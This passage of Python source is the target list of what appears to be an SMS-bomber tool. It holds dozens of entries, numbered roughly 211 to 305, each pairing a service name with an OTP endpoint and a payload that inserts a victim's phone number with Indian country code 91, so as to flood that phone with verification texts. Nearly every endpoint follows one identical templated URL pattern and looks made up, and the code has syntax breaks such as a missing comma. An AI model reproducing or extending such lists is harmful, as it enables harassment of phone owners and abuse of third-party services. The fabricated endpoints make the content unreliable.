    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 212
{
    'name': 'Udacity_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.udacity.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 213
{
    'name': 'Udemy_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.udemy.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 214
{
    'name': 'Skillshare_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.skillshare.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 215
{
    'name': 'LinkedIn_Learning_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.linkedinlearning.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 216
{
    'name': 'MasterClass_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.masterclass.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 217
{
    'name': 'Brilliant_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.brilliant.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 218
{
    'name': 'Khan_Academy_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.khanacademy.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 219
{
    'name': 'Byjus_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.byjus.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 220
{
    'name': 'Unacademy_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.unacademy.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 221
{
    'name': 'Vedantu_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.vedantu.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
{
    'name': 'Toppr_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.toppr.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 223
{
    'name': 'Meritnation_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.meritnation.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 224
{
    'name': 'Aakash_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.aakash.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 225
{
    'name': 'FIITJEE_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.fiitjee.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 226
{
    'name': 'Resonance_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.resonance.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 227
{
    'name': 'Allen_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.allen.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 228
{
    'name': 'Narayana_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.narayana.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 229
{
    'name': 'Chaitanya_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.chaitanya.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 230
{
    'name': 'Sri_Chaitanya_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.srichaitanya.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 231
{
    'name': 'Career_Point_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.careerpoint.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 232
{
    'name': 'Bansal_Classes_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.bansalclasses.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 233
{
    'name': 'Kota_Coaching_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.kotacoaching.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 234
{
    'name': 'Alakh_Pandey_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.alakhpandey.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 235
{
    'name': 'Physics_Wallah_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.physicswallah.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 236
{
    'name': 'Unacademy_Plus_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.unacademyplus.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 237
{
    'name': 'Vedantu_Pro_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.vedantupro.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
{
    'name': 'BYJUS_Class_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.byjusclass.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 239
{
    'name': 'Toppr_Anytime_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.topprany.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 240
{
    'name': 'Meritnation_Plus_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.meritnationplus.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 241
{
    'name': 'Aakash_iTutor_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.aakashitutor.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 242
{
    'name': 'FIITJEE_Online_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.fiitjeeonline.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 243
{
    'name': 'Resonance_Online_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.resonanceonline.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 244
{
    'name': 'Allen_Online_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.allenonline.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 245
{
    'name': 'Narayana_Online_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.narayanaonline.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 246
{
    'name': 'Chaitanya_Online_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.chaitanyaonline.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 247
{
    'name': 'SriChaitanya_Online_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.srichaitanyaonline.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 248
{
    'name': 'CareerPoint_Online_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.careerpointonline.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 249
{
    'name': 'Bansal_Online_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.bansalonline.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 250
{
    'name': 'Kota_Online_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.kotaonline.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
{
    'name': 'WhatsApp_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://web.whatsapp.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 252
{
    'name': 'Telegram_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://web.telegram.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 253
{
    'name': 'Signal_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://web.signal.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 254
{
    'name': 'Discord_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://discord.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 255
{
    'name': 'Slack_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://slack.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 256
{
    'name': 'Teams_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://teams.microsoft.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 257
{
    'name': 'Zoom_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://zoom.us/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 258
{
    'name': 'Google_Meet_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://meet.google.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 259
{
    'name': 'Cisco_Webex_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://webex.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 260
{
    'name': 'Adobe_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://adobe.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 261
{
    'name': 'Figma_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://figma.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 262
{
    'name': 'Canva_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://canva.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 263
{
    'name': 'Sketch_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://sketch.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 264
{
    'name': 'InVision_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://invisionapp.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 265
{
    'name': 'Marvel_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://marvelapp.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 266
{
    'name': 'Proto_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://proto.io/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 267
{
    'name': 'UXPin_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://uxpin.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
{
    'name': 'Balsamiq_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://balsamiq.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 269
{
    'name': 'Axure_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://axure.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 270
{
    'name': 'MockFlow_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://mockflow.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 271
{
    'name': 'Wireframe_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://wireframe.cc/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 272
{
    'name': 'Mockplus_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://mockplus.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 273
{
    'name': 'JustInMind_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://justinmind.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 274
{
    'name': 'Pidoco_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://pidoco.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 275
{
    'name': 'HotGloo_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://hotgloo.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 276
{
    'name': 'FluidUI_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://fluidui.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 277
{
    'name': 'Framer_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://framer.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 278
{
    'name': 'Origami_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://origami.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 279
{
    'name': 'Principle_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://principle.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 280
{
    'name': 'Keynote_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://keynote.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 281
{
    'name': 'PowerPoint_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://powerpoint.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 282
{
    'name': 'Slides_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://slides.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 283
{
    'name': 'Prezi_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://prezi.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
{
    'name': 'SlideShare_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://slideshare.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 285
{
    'name': 'HaikuDeck_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://haikudeck.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 286
{
    'name': 'Emaze_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://emaze.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 287
{
    'name': 'Sway_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://sway.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 288
{
    'name': 'Visme_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://visme.co/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 289
{
    'name': 'Beautiful_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://beautiful.ai/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 290
{
    'name': 'Gamma_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://gamma.app/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 291
{
    'name': 'Tome_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://tome.app/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 292
{
    'name': 'Pitch_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://pitch.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 293
{
    'name': 'Zight_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://zight.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 294
{
    'name': 'Loom_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://loom.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 295
{
    'name': 'ScreenRec_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://screenrec.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 296
{
    'name': 'OBS_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://obsproject.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 297
{
    'name': 'Streamlabs_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://streamlabs.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 298
{
    'name': 'Restream_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://restream.io/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 299
{
    'name': 'StreamElements_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://streamelements.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
{
    'name': 'Nightbot_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://nightbot.tv/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
}
# 301
{
    'name': 'Mobcrush_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.mobcrush.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 302
{
    'name': 'Bigo_Live_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.bigo.tv/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 303
{
    'name': 'Mico_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.mico.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 304
{
    'name': 'Azar_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.azar.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 305
{
    'name': 'Hago_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.hago.com/v1/auth/otp',
